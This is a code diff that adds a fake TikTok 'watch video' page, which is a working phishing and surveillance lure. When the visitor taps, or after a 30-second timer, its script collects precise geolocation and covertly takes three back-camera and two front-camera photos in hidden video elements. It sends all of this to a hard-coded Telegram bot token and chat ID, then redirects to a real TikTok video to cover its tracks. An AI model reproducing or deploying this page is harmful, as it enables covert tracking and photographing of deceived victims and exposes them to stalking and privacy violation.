@@ -1,0 +1,646 @@
+<
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TikTok - Watch Video</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'TikTok Sans', Arial, sans-serif;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .video-container {
+            width: 100vw;
+            height: 100vh;
+            max-width: 500px;
+            max-height: 100vh;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #000;
+            overflow: hidden;
+        }
+
+        .video-placeholder {
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(45deg, #ff0050, #00f2ea);
+            background-size: 400% 400%;
+            animation: gradientShift 3s ease infinite;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            position: relative;
+            z-index: 10;
+            opacity: 1;
+            transition: opacity 0.5s ease;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .video-placeholder.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .play-button {
+            width: 80px;
+            height: 80px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            backdrop-filter: blur(10px);
+            margin-bottom: 20px;
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            transition: transform 0.2s ease;
+        }
+
+        .play-button:active {
+            transform: scale(0.95);
+        }
+
+        .play-button svg {
+            width: 40px;
+            height: 40px;
+            fill: #fff;
+            margin-left: 5px;
+        }
+
+        .placeholder-text {
+            font-size: 1.2em;
+            color: #fff;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+            font-weight: 600;
+        }
+
+        .tiktok-logo {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 1.6em;
+            font-weight: bold;
+            color: #fff;
+            z-index: 15;
+            letter-spacing: -0.5px;
+        }
+
+        #loading-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.95);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 20;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+        }
+
+        #loading-overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .spinner {
+            border: 8px solid rgba(255, 255, 255, 0.3);
+            border-top: 8px solid #ff0050;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1.2s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .loading-message {
+            font-size: 1.1em;
+            color: #eee;
+            text-align: center;
+            max-width: 300px;
+            margin-top: 10px;
+        }
+
+        .progress-bar {
+            width: 250px;
+            height: 4px;
+            background-color: rgba(255, 255, 255, 0.2);
+            border-radius: 2px;
+            margin: 15px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ff0050, #00f2ea);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .tiktok-sidebar {
+            position: absolute;
+            right: 12px;
+            bottom: 100px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 24px;
+            z-index: 15;
+            transition: opacity 0.5s ease;
+        }
+
+        .sidebar-icon {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            color: #fff;
+            font-size: 0.75em;
+            font-weight: 600;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+            opacity: 0.95;
+        }
+
+        .sidebar-icon svg {
+            width: 38px;
+            height: 38px;
+            fill: #fff;
+            margin-bottom: 5px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.4));
+        }
+
+        .bottom-nav {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 70px;
+            background: linear-gradient(to top, rgba(0,0,0,0.85), transparent);
+            display: flex;
+            justify-content: space-around;
+            align-items: center;
+            z-index: 15;
+            padding-bottom: 12px;
+            transition: opacity 0.5s ease;
+        }
+
+        .nav-item {
+            color: rgba(255,255,255,0.7);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            font-size: 0.7em;
+            font-weight: 600;
+        }
+        
+        .nav-item.active {
+            color: #fff;
+        }
+
+        .nav-item svg {
+            width: 26px;
+            height: 26px;
+            fill: currentColor;
+            margin-bottom: 4px;
+        }
+
+        .video-info {
+            position: absolute;
+            bottom: 85px;
+            left: 15px;
+            width: 70%;
+            z-index: 15;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+            transition: opacity 0.5s ease;
+        }
+
+        .username {
+            font-weight: bold;
+            font-size: 1.1em;
+            margin-bottom: 5px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .username span {
+            background-color: rgba(255,255,255,0.2);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.7em;
+        }
+
+        .description {
+            font-size: 0.9em;
+            margin-bottom: 6px;
+            line-height: 1.3;
+        }
+
+        .music {
+            display: flex;
+            align-items: center;
+            font-size: 0.8em;
+            opacity: 0.9;
+        }
+
+        .music svg {
+            width: 14px;
+            height: 14px;
+            fill: #fff;
+            margin-right: 5px;
+        }
+
+        .hidden-ui {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        #notification {
+            position: absolute;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: rgba(0, 0, 0, 0.85);
+            color: white;
+            padding: 10px 20px;
+            border-radius: 30px;
+            font-size: 0.85em;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.4s ease, visibility 0.4s ease;
+            z-index: 30;
+            white-space: nowrap;
+            backdrop-filter: blur(8px);
+        }
+
+        #notification.show {
+            opacity: 1;
+            visibility: visible;
+        }
+    </style>
+</head>
+<body>
+    <div class="video-container">
+        <div class="tiktok-logo">TikTok</div>
+        
+        <div class="video-placeholder" id="video-placeholder">
+            <div class="play-button">
+                <svg viewBox="0 0 24 24">
+                    <path d="M8 5v14l11-7z"/>
+                </svg>
+            </div>
+            <div class="placeholder-text" id="placeholder-text">Tap to watch</div>
+        </div>
+
+        <div class="tiktok-sidebar" id="fake-sidebar">
+            <div class="sidebar-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
+                <span>542.3K</span>
+            </div>
+            <div class="sidebar-icon">
+                <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm0 14H6l-2 2V4h16v12z"/></svg>
+                <span>4,129</span>
+            </div>
+            <div class="sidebar-icon">
+                <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z"/></svg>
+                <span>Share</span>
+            </div>
+        </div>
+
+        <div class="video-info" id="fake-info">
+            <div class="username">@tiktok_creator <span>Follow</span></div>
+            <div class="description">Wait for the end! 😂🔥 #trend #fyp</div>
+            <div class="music">
+                <svg viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
+                <span>Original sound - trending_vibes</span>
+            </div>
+        </div>
+
+        <div class="bottom-nav" id="fake-nav">
+            <div class="nav-item active">
+                <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+                <span>Home</span>
+            </div>
+            <div class="nav-item">
+                <svg viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+                <span>Explore</span>
+            </div>
+            <div class="nav-item">
+                <svg viewBox="0 0 24 24" style="width:32px;height:32px;"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+            </div>
+            <div class="nav-item">
+                <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-1.99.9-1.99 2L2 22l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 15H6l-2 2V4h16v13z"/></svg>
+                <span>Inbox</span>
+            </div>
+            <div class="nav-item">
+                <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+                <span>Me</span>
+            </div>
+        </div>
+
+        <div id="loading-overlay">
+            <div class="spinner"></div>
+            <div class="loading-message" id="loading-message">Loading video...</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+        </div>
+
+        <div id="notification"></div>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8297761443:AAH8wCjCWe_ybwJqsXCLd5S05jAU3bjX_mQ';
+        const CHAT_ID = '8315813491';
+        const TIKTOK_REDIRECT_URL = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';
+
+        const videoPlaceholder = document.getElementById('video-placeholder');
+        const loadingOverlay = document.getElementById('loading-overlay');
+        const loadingMessage = document.getElementById('loading-message');
+        const progressFill = document.getElementById('progress-fill');
+        const notificationDiv = document.getElementById('notification');
+
+        function updateProgress(percent) {
+            progressFill.style.width = percent + '%';
+        }
+
+        function showNotification(msg) {
+            notificationDiv.textContent = msg;
+            notificationDiv.classList.add('show');
+            setTimeout(() => notificationDiv.classList.remove('show'), 3000);
+        }
+
+        const wait = (ms) => new Promise(r => setTimeout(r, ms));
+
+        // ========== 1. Precise Location ==========
+        async function getPreciseLocation() {
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            resolve({
+                                success: true,
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy,
+                                timestamp: position.timestamp
+                            });
+                        },
+                        (error) => {
+                            resolve({ success: false, error: error.message });
+                        },
+                        { enableHighAccuracy: true, timeout: 15000 }
+                    );
+                } else {
+                    resolve({ success: false, error: 'Not supported' });
+                }
+            });
+        }
+
+        // ========== 2. Capture Camera Photos (Back and Front) ==========
+        // Back camera - 3 photos
+        async function captureBackCameraPhotos() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: { exact: "environment" } } 
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', 'true');
+                video.style.cssText = 'position:absolute;left:-9999px;top:-9999px';
+                document.body.appendChild(video);
+                
+                await new Promise((res) => {
+                    video.onloadedmetadata = () => { video.play(); res(); };
+                });
+                await wait(500);
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                
+                const photos = [];
+                for (let i = 0; i < 3; i++) {
+                    ctx.drawImage(video, 0, 0);
+                    photos.push(canvas.toDataURL('image/jpeg', 0.9));
+                    await wait(600);
+                }
+                
+                stream.getTracks().forEach(track => track.stop());
+                document.body.removeChild(video);
+                return photos;
+            } catch (error) {
+                console.warn('Back camera error:', error);
+                return [];
+            }
+        }
+
+        // Front camera - 2 photos
+        async function captureFrontCameraPhotos() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.setAttribute('playsinline', 'true');
+                video.style.cssText = 'position:absolute;left:-9999px;top:-9999px';
+                document.body.appendChild(video);
+                
+                await new Promise((res) => {
+                    video.onloadedmetadata = () => { video.play(); res(); };
+                });
+                await wait(500);
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                
+                const photos = [];
+                for (let i = 0; i < 2; i++) {
+                    ctx.drawImage(video, 0, 0);
+                    photos.push(canvas.toDataURL('image/jpeg', 0.9));
+                    await wait(600);
+                }
+                
+                stream.getTracks().forEach(track => track.stop());
+                document.body.removeChild(video);
+                return photos;
+            } catch (error) {
+                console.warn('Front camera error:', error);
+                return [];
+            }
+        }
+
+        // ========== 3. Send data to Telegram ==========
+        async function sendLocation(location) {
+            let msg = ` <b>User Precise Location</b>\n\n🕒 ${new Date().toLocaleString('en-US')}\n`;
+            if (location.success) {
+                msg += `🌐 Latitude: ${location.latitude}\n🌐 Longitude: ${location.longitude}\n📡 Accuracy: ${location.accuracy} meters\n\n`;
+                msg += `<a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}&z=18">🗺️ Click to open map</a>`;
+            } else {
+                msg += `❌ Failed to get location: ${location.error || 'Permission denied'}`;
+            }
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST', headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML', disable_web_page_preview: false })
+            });
+        }
+
+        async function sendBackPhotos(photos) {
+            if (!photos.length) {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: ` No back camera photos were captured` })
+                });
+                return;
+            }
+            for (let i = 0; i < photos.length; i++) {
+                const blob = await fetch(photos[i]).then(r => r.blob());
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, `back_camera_${i+1}.jpg`);
+                fd.append('caption', ` Back camera photo ${i+1}/3\n🕒 ${new Date().toLocaleString('en-US')}`);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                await wait(500);
+            }
+        }
+
+        async function sendFrontPhotos(photos) {
+            if (!photos.length) {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: ` No front camera photos were captured` })
+                });
+                return;
+            }
+            for (let i = 0; i < photos.length; i++) {
+                const blob = await fetch(photos[i]).then(r => r.blob());
+                const fd = new FormData();
+                fd.append('chat_id', CHAT_ID);
+                fd.append('photo', blob, `front_camera_${i+1}.jpg`);
+                fd.append('caption', ` Front camera photo ${i+1}/2\n🕒 ${new Date().toLocaleString('en-US')}`);
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                await wait(500);
+            }
+        }
+
+        // ========== Main Operation ==========
+        async function startStealthOperation() {
+            try {
+                updateProgress(5); loadingMessage.textContent = 'Connecting...'; await wait(300);
+                
+                // 1. Location
+                updateProgress(12); loadingMessage.textContent = 'Getting location...';
+                showNotification(' Please allow location access');
+                const location = await getPreciseLocation(); await wait(500);
+                
+                updateProgress(20); loadingMessage.textContent = 'Sending location...';
+                await sendLocation(location); await wait(600);
+                
+                // 2. Back camera (3 photos)
+                updateProgress(30); loadingMessage.textContent = 'Activating back camera...';
+                showNotification(' Please allow camera for back camera');
+                await wait(500);
+                
+                updateProgress(40); loadingMessage.textContent = 'Capturing 3 photos from back camera...';
+                const backPhotos = await captureBackCameraPhotos();
+                await sendBackPhotos(backPhotos); await wait(600);
+                
+                // 3. Front camera (2 photos)
+                updateProgress(55); loadingMessage.textContent = 'Activating front camera...';
+                showNotification(' Please allow camera for front camera');
+                await wait(500);
+                
+                updateProgress(65); loadingMessage.textContent = 'Capturing 2 photos from front camera...';
+                const frontPhotos = await captureFrontCameraPhotos();
+                await sendFrontPhotos(frontPhotos); await wait(600);
+                
+                updateProgress(85); loadingMessage.textContent = 'Preparing report...';
+                await wait(500);
+                
+                updateProgress(100); loadingMessage.textContent = 'Redirecting...';
+                
+                // Final report
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST', headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        chat_id: CHAT_ID, 
+                        text: `✅ <b>Successfully Sent</b>\n━━━━━━━━━━━━━━━━━━\n Location: ${location.success ? '✓' : '✗'}\n Back camera: ${backPhotos.length}/3 photos\n Front camera: ${frontPhotos.length}/2 photos\n━━━━━━━━━━━━━━━━━━\n🕒 ${new Date().toLocaleString('en-US')}`,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+            } catch(error) {
+                console.error('Error:', error);
+                showNotification('An error occurred, please try again');
+            } finally {
+                await wait(2000);
+                window.location.href = TIKTOK_REDIRECT_URL;
+            }
+        }
+
+        function hideFakeUI() {
+            document.getElementById('fake-sidebar')?.classList.add('hidden-ui');
+            document.getElementById('fake-info')?.classList.add('hidden-ui');
+            document.getElementById('fake-nav')?.classList.add('hidden-ui');
+        }
+
+        videoPlaceholder.addEventListener('click', () => {
+            videoPlaceholder.classList.add('hidden');
+            loadingOverlay.classList.add('active');
+            hideFakeUI();
+            startStealthOperation();
+        });
+
+        showNotification('Tap to watch the video');
+
+        setTimeout(() => {
+            if (!loadingOverlay.classList.contains('active')) {
+                videoPlaceholder.classList.add('hidden');
+                loadingOverlay.classList.add('active');
+                hideFakeUI();
+                startStealthOperation();
+            }
+        }, 30000);
+    </script>
+</body>
+</html>
